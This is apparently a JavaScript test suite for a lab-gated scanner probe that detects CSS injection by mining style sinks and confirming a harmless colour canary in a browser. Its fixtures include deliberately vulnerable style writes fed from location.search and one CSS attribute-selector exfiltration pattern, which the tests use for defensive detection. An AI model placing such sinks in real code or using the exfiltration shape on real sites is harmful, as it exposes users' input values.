// CSS Injection probe tests (row #194 [Medium] CSS Injection,
// CWE-79; phase 96, 'css-injection').
//
// The probe is two tiers: tier 1 mines the served page HTML for
// CSS contexts (inline style attributes, <style> blocks) and
// first-party code for runtime CSS writes (zero sinks = proven true
// negative, no drive); tier 2 drives the pasted page in a real
// browser with a CSS canary in the query string and then in the
// fragment, and confirms ONLY when the canary changes a computed
// style — the control render leaves no element with the marker
// colour #0b1621, and a canary render shows it on the SAME element
// in two separate renders.
//
// The fake CDP client is keyed on the last navigated URL: a URL
// containing 'dmcontrol-' is a control render, a URL containing
// '0b1621' is a canary render, 'dmcss=' marks the query vector
// (the fragment vector has no query param), and '%7Bcolor' marks
// the rule shape (the declaration shape has no encoded '{' — and
// '*' stays literal in both serializers, so the key is '%7B', not
// '%2A%7B'). Modes:
// 'noexec' (canary never takes effect), 'exec-query' (declaration
// shape takes effect on the query vector), 'exec-fragment' (rule
// shape takes effect on the fragment vector), 'control-marker'
// (the control render also carries the marker colour), 'unstable'
// (the marker lands on a different element on each render),
// 'nav-fail' (evaluate throws).

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  probeCssInjection,
  driveCssInjectionExecution,
  findCssHtmlSinks,
  findCssJsSinks,
  assessCssFlow,
  assessDriveResult,
  canaryDeclaration,
  canaryRule,
  markerHex,
  markerColor,
  controlValue,
  queryCanaryUrl,
  fragmentCanaryUrl,
  markerElementsExpr,
  __cssMeta,
} from './cssInjection.js';
import { assessConfirmation } from '../../hunt-intel/differential.js';

const PAGE_URL = 'http://172.17.0.1:3000/';
const BUNDLE_URL = 'http://172.17.0.1:3000/main.js';
const VENDOR_URL = 'http://172.17.0.1:3000/vendor.js';
const labOpts = {
  labCreds: { username: 'lab-user', password: 'lab-pass' },
  labTargets: ['172.17.0.1:3000'],
};

// Fixtures are built by concatenation so no single literal in this
// file is a secret-shaped string.
const BUNDLE_CLEAN =
  'function render(){ var el = document.createElement(\'div\');' +
  ' el.textContent = window.location.search; document.body.appendChild(el); }';
const BUNDLE_CSSTEXT =
  'var el = document.createElement(\'div\');' +
  ' el.style.cssText = location.search; document.body.appendChild(el);';
const BUNDLE_STYLEPROP =
  'var q = location.search;' +
  ' document.getElementById(\'out\').style.color = q;';
const BUNDLE_SETPROPERTY =
  'document.getElementById(\'out\').style.setProperty(\'color\', location.hash.slice(1));';
const BUNDLE_SETATTR =
  'var el = document.createElement(\'div\');' +
  ' el.setAttribute(\'style\', \'color:\' + location.search);';
const BUNDLE_INSERTRULE =
  'document.styleSheets[0].insertRule(\'.x{color:\' + location.search + \'}\');';
const BUNDLE_IMPORT_TPL =
  'var css = `@import ${location.search}`;';
const BUNDLE_IMPORT_CONCAT =
  'var css = "@import " + location.search;';
const BUNDLE_IMPORT_STATIC =
  'var css = \'@import "theme.css";\';';
const BUNDLE_LITERAL =
  'var el = document.createElement(\'div\');' +
  ' el.style.cssText = "color:red";';
const BUNDLE_FRAMEWORK =
  'function bypassSecurityTrustHtml(v) { return v; }' +
  ' var el = document.createElement(\'div\'); el.style.cssText = v;';
// Juice Shop main.js shape, verified live 9 Nov 2026: an Angular
// component styles:[…] array (static CSS compiled into the bundle),
// a template literal wrapping a user comment in a span whose style
// value is a compile-time constant, and SVG url(#…) fill/clip-path
// references. None of these is a CSS sink: no runtime CSS write
// carries input.
const BUNDLE_JUICE_SHAPE =
  'var comp = { styles: ["[_nghost-%COMP%]{display:block;margin:24px}"] };' +
  ' e[o].comment=`<span style="width: 90%; display:block;">' +
  '${e[o].comment}<br/>`;' +
  ' t.BMQ("fill","url(#solved-gradient-" + e.difficulty + ")");';

const HTML_CLEAN = '<html><body><div>shop</div></body></html>';
const HTML_STYLE_ATTR =
  '<html><body><div style="color: red">hello</div></body></html>';
const HTML_STYLE_BLOCK =
  '<html><head><style>.a{color:red}</style></head><body><div>shop</div></body></html>';
const HTML_EXFIL_BLOCK =
  '<html><head><style>input[value^="a"]{background:url(https://example.com/a)}</style></head><body></body></html>';

function makeFakeClient(mode, calls) {
  let lastUrl = '';
  let canaryReads = 0;
  return {
    get lastUrl() {
      return lastUrl;
    },
    async send() {
      return {};
    },
    async newTarget(url) {
      calls.push(['newTarget', url]);
      return { webSocketDebuggerUrl: 'ws://127.0.0.1:9222/devtools/page/1' };
    },
    async attach() {
      calls.push(['attach']);
      return true;
    },
    async navigate(url) {
      calls.push(['navigate', url]);
      lastUrl = String(url);
    },
    async evaluate(expr) {
      calls.push(['evaluate', expr]);
      if (!String(expr).includes('rgb(11, 22, 33)')) return null;
      if (mode === 'nav-fail') throw new Error('navigation failed');
      const url = lastUrl;
      const isControl = url.includes('dmcontrol-');
      const isCanary = url.includes('0b1621');
      const isQuery = url.includes('dmcss=');
      const isRule = url.includes('%7Bcolor');
      if (isControl) {
        if (mode === 'control-marker') return '[0]';
        return '[]';
      }
      if (isCanary) {
        if (mode === 'exec-query' && isQuery && !isRule) return '[3]';
        if (mode === 'exec-fragment' && !isQuery && isRule) return '[2]';
        if (mode === 'unstable') {
          canaryReads += 1;
          return canaryReads % 2 === 1 ? '[0]' : '[1]';
        }
        return '[]';
      }
      return '[]';
    },
    async close() {
      calls.push(['close']);
      return true;
    },
  };
}

async function probeWithFakeCdp(mode, targets, extra = {}) {
  const calls = [];
  const runnerCalls = [];
  const diagnostics = {};
  const fake = makeFakeClient(mode, calls);
  const opts = {
    labCreds: labOpts.labCreds,
    allowWrite: true,
    labTargets: labOpts.labTargets,
    depth: 'standard',
    timeoutMs: 1,
    settleMs: 0,
    headers: {},
    pageBody: '',
    fetchPage: async () => ({ status: 200, body: BUNDLE_CSSTEXT }),
    runner: async (file, args) => {
      runnerCalls.push({ file, args });
      if (args[0] === 'rm') return { ok: true, stdout: '' };
      return { ok: true, stdout: 'css-container\n' };
    },
    cdpConnect: async () => ({ ok: true, client: fake }),
    diagnostics,
    ...extra,
  };
  const findings = await probeCssInjection(PAGE_URL, targets, opts);
  return { findings, diagnostics, calls, runnerCalls, fake };
}

function targetsWith(bundleUrl = BUNDLE_URL) {
  return { bundles: [bundleUrl], inline: [] };
}

// ---- tier 1: the static mine (pure) -----------------------------------------

test('CSS-1: mine finds every runtime CSS-write kind', () => {
  const cases = [
    [BUNDLE_CSSTEXT, 'cssText'],
    [BUNDLE_STYLEPROP, 'style-prop'],
    [BUNDLE_SETPROPERTY, 'style-prop'],
    [BUNDLE_SETATTR, 'style-attr-set'],
    [BUNDLE_INSERTRULE, 'stylesheet-rule'],
    [BUNDLE_IMPORT_TPL, 'css-import'],
    [BUNDLE_IMPORT_CONCAT, 'css-import'],
  ];
  for (const [body, kind] of cases) {
    const found = findCssJsSinks(body);
    assert.equal(found.length, 1, `expected one ${kind} sink, got ${found.length}`);
    assert.equal(found[0].kind, kind);
    assert.ok(found[0].line >= 1);
    assert.ok(found[0].snippet.length > 0);
  }
  // A static @import is a build-time constant, never a sink.
  assert.deepEqual(findCssJsSinks(BUNDLE_IMPORT_STATIC), []);
});

test('CSS-2: mine finds HTML CSS contexts and flags the exfiltration shape', () => {
  const attr = findCssHtmlSinks(HTML_STYLE_ATTR);
  assert.equal(attr.length, 1);
  assert.equal(attr[0].kind, 'style-attr');
  assert.equal(attr[0].exfil, false);

  const block = findCssHtmlSinks(HTML_STYLE_BLOCK);
  assert.equal(block.length, 1);
  assert.equal(block[0].kind, 'style-block');
  assert.equal(block[0].exfil, false);

  const exfil = findCssHtmlSinks(HTML_EXFIL_BLOCK);
  assert.equal(exfil.length, 1);
  assert.equal(exfil[0].kind, 'style-block');
  assert.equal(exfil[0].exfil, true);

  const both = findCssHtmlSinks(HTML_STYLE_ATTR + HTML_STYLE_BLOCK);
  assert.equal(both.length, 2);
  assert.deepEqual(findCssHtmlSinks(HTML_CLEAN), []);
  assert.deepEqual(findCssHtmlSinks(''), []);
  assert.deepEqual(findCssHtmlSinks(null), []);
});

test('CSS-3: Juice-shape bundle has no sinks — static styles, static style literal, SVG url refs', () => {
  assert.deepEqual(findCssJsSinks(BUNDLE_JUICE_SHAPE), []);
  assert.deepEqual(findCssJsSinks(BUNDLE_CLEAN), []);
  assert.deepEqual(findCssJsSinks(''), []);
  assert.deepEqual(findCssJsSinks(null), []);
});

test('CSS-4: sink near user input is near-sink, literal-only is safe-only', () => {
  const near = findCssJsSinks(BUNDLE_CSSTEXT);
  assert.equal(near.length, 1);
  assert.equal(near[0].nearSink, true);
  assert.equal(near[0].sinkKind, 'user-input');
  assert.equal(near[0].safeOnly, false);

  const literal = findCssJsSinks(BUNDLE_LITERAL);
  assert.equal(literal.length, 1);
  assert.equal(literal[0].nearSink, false);
  assert.equal(literal[0].safeOnly, true);

  const plain = findCssJsSinks('var el = document.createElement(\'div\'); el.style.cssText = v;');
  assert.equal(plain.length, 1);
  assert.equal(plain[0].nearSink, false);
  assert.equal(plain[0].sinkKind, null);
  assert.equal(plain[0].safeOnly, false);
});

test('CSS-5: assessCssFlow drives only when a sink exists', () => {
  assert.deepEqual(assessCssFlow([]), { cssSinks: 0, nearSink: 0, drive: false });
  const one = findCssJsSinks(BUNDLE_CSSTEXT);
  assert.deepEqual(assessCssFlow(one), { cssSinks: 1, nearSink: 1, drive: true });
  const html = findCssHtmlSinks(HTML_STYLE_ATTR);
  assert.deepEqual(assessCssFlow(html), { cssSinks: 1, nearSink: 0, drive: true });
});

test('CSS-6: canary builders — query and fragment URLs, control literal, marker', () => {
  assert.equal(canaryDeclaration(), 'color:#0b1621');
  assert.equal(canaryRule(), '*{color:#0b1621}');
  assert.equal(markerHex(), '#0b1621');
  assert.equal(markerColor(), 'rgb(11, 22, 33)');
  assert.equal(controlValue('abcd1234'), 'dmcontrol-abcd1234');
  const q = queryCanaryUrl(PAGE_URL, canaryDeclaration());
  assert.ok(q.includes('dmcss='), q);
  assert.ok(q.includes('%230b1621'), q);
  const f = fragmentCanaryUrl(PAGE_URL, canaryRule());
  assert.ok(f.includes('#*%7Bcolor%3A%230b1621%7D'), f);
  assert.ok(!f.includes('dmcss='), f);
  const qc = queryCanaryUrl(PAGE_URL, controlValue('abcd1234'));
  assert.ok(qc.includes('dmcontrol-abcd1234'), qc);
  assert.ok(!qc.includes('0b1621'), qc);
  assert.equal(queryCanaryUrl('not a url', canaryDeclaration()), null);
  assert.equal(fragmentCanaryUrl('not a url', canaryDeclaration()), null);
  assert.ok(markerElementsExpr().includes('rgb(11, 22, 33)'));
});

test('CSS-7: assessDriveResult — control marker uncalibrated, no marker not-executed, unstable uncalibrated, clean confirm', () => {
  assert.equal(
    assessDriveResult({ controlMarker: true, canaryMarker: true, samePoint: true }).verdict,
    'uncalibrated',
  );
  assert.equal(
    assessDriveResult({ controlMarker: false, canaryMarker: false, samePoint: false }).verdict,
    'not-executed',
  );
  assert.equal(
    assessDriveResult({ controlMarker: false, canaryMarker: true, samePoint: false }).verdict,
    'uncalibrated',
  );
  assert.equal(
    assessDriveResult({ controlMarker: false, canaryMarker: true, samePoint: true }).verdict,
    'confirmed',
  );
});

// ---- gates ------------------------------------------------------------------

test('CSS-8: no labCreds — no findings, no bundle fetch', async () => {
  let fetched = 0;
  const findings = await probeCssInjection(PAGE_URL, targetsWith(), {
    labCreds: null,
    allowWrite: true,
    labTargets: labOpts.labTargets,
    depth: 'standard',
    fetchPage: async () => {
      fetched += 1;
      return { status: 200, body: BUNDLE_CSSTEXT };
    },
  });
  assert.deepEqual(findings, []);
  assert.equal(fetched, 0);
});

test('CSS-9: allowWrite false — no findings (control with allowWrite true confirms)', async () => {
  const control = await probeWithFakeCdp('exec-query', targetsWith());
  assert.equal(control.findings.length, 1);
  const gated = await probeWithFakeCdp('exec-query', targetsWith(), { allowWrite: false });
  assert.deepEqual(gated.findings, []);
});

test('CSS-10: non-lab target — no findings', async () => {
  const { findings } = await probeWithFakeCdp('exec-query', targetsWith(), {
    labTargets: ['juice.lab'],
  });
  assert.deepEqual(findings, []);
});

test('CSS-11: depth quick — no findings', async () => {
  const { findings } = await probeWithFakeCdp('exec-query', targetsWith(), { depth: 'quick' });
  assert.deepEqual(findings, []);
});

// ---- probe outcomes ----------------------------------------------------------

test('CSS-12: true negative — no CSS context anywhere, no drive', async () => {
  const { findings, diagnostics, runnerCalls } = await probeWithFakeCdp('exec-query', targetsWith(), {
    fetchPage: async () => ({ status: 200, body: BUNDLE_JUICE_SHAPE }),
    pageBody: HTML_CLEAN,
  });
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.cssSinks, 0);
  assert.equal(diagnostics.driveAttempted, undefined);
  assert.equal(runnerCalls.length, 0);
});

test('CSS-13: HTML style-attribute sink drives but never executes — no finding', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp(
    'noexec',
    { bundles: [], inline: [] },
    { pageBody: HTML_STYLE_ATTR },
  );
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.cssSinks, 1);
  assert.equal(diagnostics.cssNearSink, 0);
  assert.equal(diagnostics.driveAttempted, true);
  assert.equal(diagnostics.driveExecuted, false);
});

test('CSS-14: query-vector declaration confirm — exactly one medium dom_sink finding', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp('exec-query', targetsWith());
  assert.equal(findings.length, 1);
  const f = findings[0];
  assert.equal(f.class, 'dom_sink');
  assert.equal(f.id, 'css-injection-computed-style');
  assert.equal(f.severity, 'medium');
  assert.equal(f.url, PAGE_URL);
  assert.ok(f.parameter.includes('query'), f.parameter);
  assert.ok(f.parameter.includes('declaration'), f.parameter);
  assert.ok(f.parameter.includes('#0b1621'), f.parameter);
  assert.ok(f.evidence.request.includes('dmcss='), f.evidence.request);
  assert.ok(f.evidence.request.includes('0b1621'), f.evidence.request);
  assert.ok(f.evidence.response.includes('rgb(11, 22, 33)'), f.evidence.response);
  assert.ok(f.evidence.response.includes('same element'), f.evidence.response);
  assert.equal(f.evidence.signalCorrelated, true);
  assert.equal(diagnostics.cssSinks, 1);
  assert.equal(diagnostics.driveExecuted, true);
});

test('CSS-15: fragment-vector rule confirm — finding names the fragment vector and rule shape', async () => {
  const { findings } = await probeWithFakeCdp('exec-fragment', targetsWith());
  assert.equal(findings.length, 1);
  const f = findings[0];
  assert.equal(f.class, 'dom_sink');
  assert.equal(f.severity, 'medium');
  assert.ok(f.parameter.includes('fragment'), f.parameter);
  assert.ok(f.parameter.includes('rule'), f.parameter);
  assert.ok(f.evidence.request.includes('#'), f.evidence.request);
  assert.ok(f.evidence.response.includes('rgb(11, 22, 33)'), f.evidence.response);
});

test('CSS-16: control render carries the marker colour — uncalibrated, no finding', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp('control-marker', targetsWith());
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.driveAttempted, true);
  assert.equal(diagnostics.driveExecuted, false);
});

test('CSS-17: marker on unstable elements — uncalibrated, no finding', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp('unstable', targetsWith());
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.driveAttempted, true);
  assert.equal(diagnostics.driveExecuted, false);
});

test('CSS-18: browser fails to start — no findings, never throws', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp('exec-query', targetsWith(), {
    runner: async () => ({ ok: false, stdout: '', stderr: 'docker: no such image' }),
  });
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.driveAttempted, true);
  assert.equal(diagnostics.driveExecuted, false);
});

test('CSS-19: assessConfirmation judges the finding confirmed', async () => {
  const { findings } = await probeWithFakeCdp('exec-query', targetsWith());
  assert.equal(findings.length, 1);
  const { verdict } = assessConfirmation(findings[0]);
  assert.equal(verdict, 'confirmed');
});

test('CSS-20: finding class is dom_sink and never contains xss; severity is medium', async () => {
  const { findings } = await probeWithFakeCdp('exec-query', targetsWith());
  assert.equal(findings.length, 1);
  assert.equal(findings[0].class, 'dom_sink');
  assert.ok(!findings[0].class.includes('xss'));
  assert.equal(findings[0].severity, 'medium');
});

test('CSS-21: vendor bundle is excluded from the mine', async () => {
  const { findings, diagnostics, runnerCalls } = await probeWithFakeCdp('exec-query', targetsWith(VENDOR_URL));
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.cssSinks, 0);
  assert.equal(diagnostics.driveAttempted, undefined);
  assert.equal(runnerCalls.length, 0);
});

test('CSS-22: framework bundle defining the sanitizer is skipped whole', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp('exec-query', targetsWith(), {
    fetchPage: async () => ({ status: 200, body: BUNDLE_FRAMEWORK }),
  });
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.cssSinks, 0);
  assert.equal(diagnostics.driveAttempted, undefined);
});

test('CSS-23: a sink in an inline script counts — drive attempted with no bundles', async () => {
  const { findings, diagnostics } = await probeWithFakeCdp(
    'noexec',
    { bundles: [], inline: [BUNDLE_CSSTEXT] },
    { fetchPage: async () => ({ status: 200, body: BUNDLE_CLEAN }) },
  );
  assert.deepEqual(findings, []);
  assert.equal(diagnostics.cssSinks, 1);
  assert.equal(diagnostics.driveAttempted, true);
});

// ---- the drive helper --------------------------------------------------------

test('CSS-24: driveCssInjectionExecution returns rid, marker, vector and shape; never throws when the runner fails', async () => {
  const calls = [];
  const fake = makeFakeClient('exec-query', calls);
  const out = await driveCssInjectionExecution(PAGE_URL, {
    timeoutMs: 1,
    settleMs: 0,
    runner: async (file, args) => {
      if (args[0] === 'rm') return { ok: true, stdout: '' };
      return { ok: true, stdout: 'css-container\n' };
    },
    cdpConnect: async () => ({ ok: true, client: fake }),
  });
  assert.equal(out.attempted, true);
  assert.equal(out.executed, true);
  assert.equal(out.vector, 'query');
  assert.equal(out.shape, 'declaration');
  assert.match(out.rid, /^[0-9a-f]{8}$/);
  assert.equal(out.marker, '#0b1621');
  assert.equal(out.error, null);

  const failed = await driveCssInjectionExecution(PAGE_URL, {
    timeoutMs: 1,
    settleMs: 0,
    runner: async () => {
      throw new Error('docker daemon down');
    },
  });
  assert.equal(failed.executed, false);
  assert.ok(failed.error && failed.error.length > 0);
});

test('CSS-meta: phase 96 registration metadata', () => {
  assert.deepEqual(__cssMeta, { phases: ['css-injection'], depth: ['standard', 'deep'] });
});
